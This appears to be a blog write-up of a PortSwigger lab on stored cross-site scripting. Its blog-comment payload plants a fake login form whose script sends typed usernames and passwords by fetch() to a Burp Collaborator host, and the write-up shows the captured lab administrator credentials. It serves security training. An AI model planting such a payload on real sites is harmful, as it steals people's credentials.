---
layout: post
title:  "Exploiting cross-site scripting to capture passwords"
date:   2024-09-29 09:39:54 +0530
categories: [BSCP, XSS]
---

## Initial Information 

This lab contains a [stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account.


## Things to Remember 

<p>
    To prevent the Academy platform from being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use <mark>Burp Collaborator’s default public server</mark>.
</p>
<p>
    Some users will notice that there is an alternative solution to this lab that does not require Burp Collaborator. However, it is far less subtle than <mark>exfiltrating the cookie</mark>.
</p>



## Solution

Same as like what we saw in [Exploiting cross-site scripting to steal cookies](Exploiting cross-site scripting to steal cookies.md) where the blog comment is vulnerable to XSS attack

  

![]({{ site.baseurl }}/assets/images/image%207.png)  

  

Now we will use the following payload to exfil the username and password and send it to our burp collaborator and one thing to note in our payload is we have `no-cors` in order to allow the cross origin requests through a POST request

  

```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('http://s2vt9769p5oun3xnh0d4x0kjpav6jw7l.oastify.com',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

  

Once after posting the payload as looking through the collaborator and recieved a HTTP pingback with the admin credentials 

  

![]({{ site.baseurl }}/assets/images/image%208.png)  

  

These are the credentials ( administrator:l3727agar6s0uz29al5h ) and Once we login with that, our lab is solved 

  

![]({{ site.baseurl }}/assets/images/image%209.png)